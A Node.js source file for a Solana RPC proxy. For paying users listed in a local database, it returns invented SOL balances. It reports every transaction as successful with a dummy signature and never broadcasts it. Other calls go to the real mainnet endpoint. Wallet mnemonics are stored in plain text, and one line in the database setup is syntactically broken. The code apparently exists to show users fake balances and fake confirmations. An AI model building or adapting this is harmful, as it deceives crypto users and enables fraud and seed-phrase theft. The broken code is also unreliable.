// rpc-proxy.js → FINAL UNBREAKABLE VERSION (Dec 2025)
require('dotenv').config();
const express = require('express');
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();

const app = express();
app.use(express.json({ limit: '10mb' }));

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', '*');
  next();
});

const REAL_RPC = 'https://api.mainnet-beta.solana.com';

const db = new sqlite3.Database('crucible.db', err => {
  if (err ? console.error(err) : console.log('DB connected');
  db.run(`CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    paid INTEGER DEFAULT 0,
    balance REAL,
    target REAL,
    bounty REAL,
    start_date TEXT,
    mnemonic TEXT,
    publicKey TEXT,
    failed INTEGER DEFAULT 0
  )`);
});

const virtualSol = new Map();

function load() {
  db.all(`SELECT publicKey, balance FROM users WHERE paid=1 AND failed=0`, (err, rows) => {
    virtualSol.clear();
    if (err) return console.error(err);
    (rows || []).forEach(r => r.publicKey && virtualSol.set(r.publicKey, Number(r.balance || 500)));
    console.log(`Loaded ${virtualSol.size} accounts`);
  });
}
load();
setInterval(load, 12000);

// MAIN ENDPOINT
app.post('/', async (req, res) => {
  const body = req.body || {};
  const { method = '', params = [], id = null } = body;
  const pubkey = params[0]?.toString?.() || params[0];

  try {
    // Fake SOL balance
    if (method === 'getBalance' && virtualSol.has(pubkey)) {
      const sol = virtualSol.get(pubkey);
      return res.json({
        jsonrpc: '2.0',
        id,
        result: { value: Math.floor(sol * 1_000_000_000) }
      });
    }

    // Fake tx success (stops 429 flood from Jupiter)
    if (method === 'sendTransaction') {
      return res.json({
        jsonrpc: '2.0',
        id,
        result: '1111111111111111111111111111111111111111111111111111111111111111'
      });
    }

    // Everything else → real RPC (with rate-limit protection)
    const response = await axios.post(REAL_RPC, body, {
      timeout: 12000,
      headers: { 'Content-Type': 'application/json' }
    });
    res.json(response.data);

  } catch (error) {
    console.error('RPC fallback error:', error.message);
    res.json({
      jsonrpc: '2.0',
      id,
      error: { code: -32603, message: 'Internal error' }
    });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('FAKE SOL RPC 100% LIVE — NO MORE 429 / ID ERRORS');
  console.log(`URL → https://your-rpc-service.onrender.com`);
});
